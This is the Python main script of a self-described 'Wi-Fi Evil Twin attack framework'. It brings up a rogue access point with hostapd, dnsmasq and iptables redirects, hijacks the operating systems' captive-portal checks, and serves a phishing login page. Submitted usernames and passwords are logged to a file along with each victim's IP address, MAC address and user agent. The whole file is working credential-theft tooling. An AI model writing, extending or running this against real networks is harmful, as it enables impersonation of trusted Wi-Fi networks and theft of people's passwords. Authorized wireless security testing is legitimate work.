#!/usr/bin/env python3

import re
import os
import sys
import time
import json
import signal
import argparse
import threading
import subprocess
from queue import Queue
from utilities.dashboard import dashboard
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

from colorama import Fore, Style
from utilities.arts import banner
from utilities.helpers import notify_password_captured, clear_screen
from utilities.configurations import configure_dnsmasq, configure_hostapd
from utilities.services import setup_interface, stop_network_services, monitor_clients
from utilities.constants import COMMANDS, REDIRECT_URL, PASSWORD_CAPTURED, FILENAME, PHISHING_PORT, CAPTURED_CREDENTIALS


log_queue = Queue()
os.makedirs("credentials", exist_ok=True)
cached_templates = {}


def log_writer():
    while True:
        log_entry = log_queue.get()
        if log_entry is None:
            break
        with open(f"{args.ssid}.log", "a") as log_file:
            log_file.write(log_entry + "\n")


class LightweightHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    
    def log_request(self, code='-', size='-'):
        client_ip = self.client_address[0]
        timestamp = time.strftime("%d/%b/%Y %H:%M:%S")
        method = self.command
        path = self.path
        protocol = self.request_version
        user_agent = self.headers.get('User-Agent', '-')
        mac = self.get_client_mac()

        log_line = f"\n{client_ip} ({mac}) - - [{timestamp}] \"{method} {path} {protocol}\" {code} \"{user_agent}\""
        print(log_line)
        log_queue.put(log_line)

    def get_client_mac(self):
        ip = self.client_address[0]
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if parts[0] == ip:
                        return parts[3]
        except Exception as e:
            self.log_message(f"Error reading ARP table: {e}")
        return "unknown"

    def do_GET(self):
        self.log_request()

        captive_urls = {
            "/generate_204": REDIRECT_URL,
            "/hotspot-detect.html": REDIRECT_URL,
            "/library/test/success.html": REDIRECT_URL,
            "/ncsi.txt": REDIRECT_URL,
            "/connectivity-check.html": REDIRECT_URL,
            "/captiveportal": REDIRECT_URL
        }

        if self.path in captive_urls:
            if "CaptiveNetworkSupport" in self.headers.get('User-Agent', ''):
                if self.path == "/hotspot-detect.html":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>")
                elif self.path == "/generate_204":
                    self.send_response(204)
                    self.end_headers()
                else:
                    self.send_response(302)
                    self.send_header("Location", REDIRECT_URL)
                    self.end_headers()
            else:
                self.send_response(302)
                self.send_header("Location", REDIRECT_URL)
                self.end_headers()
            self.log_request(302 if self.path != "/generate_204" else 204)
            return

        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            if "index" not in cached_templates:
                with open("phishing_templates/index.html", "r") as f:
                    cached_templates["index"] = f.read().replace("{ssid}", args.ssid)
            self.wfile.write(cached_templates["index"].encode())
            self.log_request(200)
            return

        if self.path == "/success":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            if "success" not in cached_templates:
                with open("phishing_templates/success.html", "rb") as f:
                    cached_templates["success"] = f.read()
            self.wfile.write(cached_templates["success"])
            self.log_request(200)
            return

        if self.path.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
            try:
                filepath = os.path.join("phishing_templates", self.path[1:])
                with open(filepath, "rb") as f:
                    self.send_response(200)
                    if self.path.endswith(".css"):
                        self.send_header("Content-type", "text/css")
                    elif self.path.endswith(".js"):
                        self.send_header("Content-type", "application/javascript")
                    elif self.path.endswith(".png"):
                        self.send_header("Content-type", "image/png")
                    elif self.path.endswith(".jpg"):
                        self.send_header("Content-type", "image/jpeg")
                    elif self.path.endswith(".ico"):
                        self.send_header("Content-type", "image/x-icon")
                    self.end_headers()
                    self.wfile.write(f.read())
                self.log_request(200)
                return
            except IOError:
                self.send_error(404)
                self.log_request(404)
                return

        self.send_response(302)
        self.send_header("Location", REDIRECT_URL)
        self.end_headers()
        self.log_request(302)

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            self.log_request(size=content_length)

            if self.path == "/login":
                post_data = self.rfile.read(content_length).decode('utf-8', errors='replace')
                username = re.search(r"username=([^&]*)", post_data)
                password = re.search(r"password=([^&]*)", post_data)

                global PASSWORD_CAPTURED, CAPTURED_CREDENTIALS
                PASSWORD_CAPTURED = True
                CAPTURED_CREDENTIALS = {
                    "ssid": args.ssid,
                    "username": username.group(1) if username else "",
                    "password": password.group(1) if password else "",
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "client_ip": self.client_address[0],
                    "user_agent": self.headers.get('User-Agent', 'unknown'),
                    "mac_address": self.get_client_mac(),
                    "post_data": post_data
                }

                with open(FILENAME, "a") as f:
                    f.write(json.dumps(CAPTURED_CREDENTIALS) + "\n")

                notify_password_captured(CAPTURED_CREDENTIALS)

                self.send_response(302)
                self.send_header("Location", REDIRECT_URL + "success")
                self.end_headers()
                self.log_request(302)
            else:
                self.send_error(404, "Not Found")
                self.log_request(404)
        except Exception as e:
            self.log_message(f"Error processing POST: {str(e)}")
            self.send_error(500)
            self.log_request(500)


def start_services(interface):
    try:
        dnsmasq = subprocess.Popen(["dnsmasq", "-C", "settings/dnsmasq.conf"])  # start dnsmasq (dns & dhcp)
        hostapd = subprocess.Popen(["hostapd", "settings/hostapd.conf", "-B"])  # start fake acces point
        
        server = ThreadingHTTPServer(("192.168.1.1", PHISHING_PORT), LightweightHTTPHandler)  # start HTTP server
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        # apply all iptables rules
        for cmd in COMMANDS:
            try:
                subprocess.run(cmd, check=True)
            except subprocess.CalledProcessError as e:
                print(f"[-] Error running command: {' '.join(cmd)}\n{e}")

        monitor_thread = threading.Thread(target=monitor_clients, args=(interface,))
        monitor_thread.daemon = True
        monitor_thread.start()

        return dnsmasq, hostapd, server
    except Exception as e:
        print(f"[-] Error starting services: {e}")
        sys.exit(1)


def cleanup(interface, processes):
    print("\n[!] Cleaning up...")
    try:
        for p in processes:
            if p and p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()

        subprocess.run(["pkill", "-9", "dnsmasq"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "hostapd"], stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], check=True)
        subprocess.run(["iptables", "-t", "nat", "-X"], check=True)
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        subprocess.run(["systemctl", "start", "wpa_supplicant"], check=True)

        if PASSWORD_CAPTURED:
            print("═" * 62)
            print(Fore.GREEN + Style.BRIGHT + "[+] Wi-Fi password captured!" + Style.RESET_ALL)
            print(json.dumps(CAPTURED_CREDENTIALS, indent=2))
            print(Fore.GREEN + Style.BRIGHT + "  ==> Credentials saved to credentials/Wi-Fi_credentials.jsonl" + Style.RESET_ALL)
            print("═" * 62)

        print("[✔] Cleanup complete\n")
    except subprocess.CalledProcessError as e:
        print(f"[-] Command failed during cleanup: {e}")
    except Exception as e:
        print(f"[-] Unexpected error during cleanup: {e}")
    finally:
        for p in processes:
            if p and p.poll() is None:
                p.kill()


def signal_handler(sig, frame):
    cleanup(args.interface, processes)
    log_queue.put(None)
    log_thread.join()
    sys.exit(0)


def main():
    global args, processes, log_thread
    parser = argparse.ArgumentParser(description="Wi-Fi Evil Twin attack framework by Saher Muhamed v1.0.0")
    parser.add_argument("-s", "--ssid", required=True, help="SSID (network name) for the fake AP")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Channel number (1-11)")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface AP mode supported")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Please run script as root")
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    clear_screen()
    banner()
    
    dashboard.run()  # start dashboard before other services
    
    configure_dnsmasq(args.interface)
    configure_hostapd(args.ssid, args.channel, args.interface)
    stop_network_services()
    setup_interface(args.interface)
    
    # Update dashboard with current SSID and channel
    dashboard.update_ap_info(ssid=args.ssid, channel=args.channel, interface=args.interface, status="Running")

    processes = []
    log_thread = threading.Thread(target=log_writer)
    log_thread.start()

    try:
        dnsmasq, hostapd, server = start_services(args.interface)
        processes.extend([dnsmasq, hostapd])

        print(f"\n[+] Fake access point '{args.ssid}' running on channel {args.channel}")
        print(f"[+] 🌍 Web interface dashboard available at http://0.0.0.0:5000")

        server.serve_forever()
    except KeyboardInterrupt:
        signal_handler(None, None)
    except Exception as e:
        print(f"[-] Error: {e}")
        signal_handler(None, None)


if __name__ == "__main__":
    main()
